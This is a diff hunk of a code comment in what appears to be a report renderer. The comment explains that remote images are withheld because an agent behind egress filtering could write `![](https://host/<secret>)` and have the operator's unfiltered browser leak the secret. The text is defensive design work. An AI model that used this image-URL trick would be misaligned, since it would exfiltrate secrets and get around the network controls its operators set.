@@ -91,7 +91,7 @@ const REMOTE_IMAGE_AUTHORITY = /^https?:\/\//i;
 // renderer does. An <img> is the only thing in a document that reaches the
 // network on its own, with no click — and the document's author is an agent
 // that may be running behind this project's own egress boundary (see
-// docs/linux-network-filtering.md: default-drop nftables plus a DNS broker
+// docs/network-filtering.md: default-drop nftables plus a DNS broker
 // admitting only authored names). Rendered eagerly, an agent could write
 // `![](https://host/<secret>)`, wait for the operator to open the report, and
 // have the operator's UNFILTERED browser make the request the agent could not
